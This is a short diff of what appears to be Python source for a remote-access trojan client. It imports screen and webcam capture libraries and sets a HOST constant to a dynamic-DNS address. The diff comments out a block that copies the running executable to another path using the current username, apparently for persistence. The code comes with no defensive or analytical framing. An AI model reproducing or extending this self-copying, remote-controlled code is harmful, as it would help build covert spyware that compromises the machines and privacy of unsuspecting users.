@@ -13,6 +13,7 @@ from tkinter import messagebox
 import cv2
 import pyautogui
 
+"""
 try:
     pfilename = str(os.path.basename(sys.executable))
     username = os.getenv('username')
@@ -34,6 +35,8 @@ try:
     ocd = shutil.copyfile(str(pfilename), str(fp3 + cfilename))
 except:
     pass
+
+"""
 
 HEADER = 50
 HOST = 'webtools.onthewifi.com'
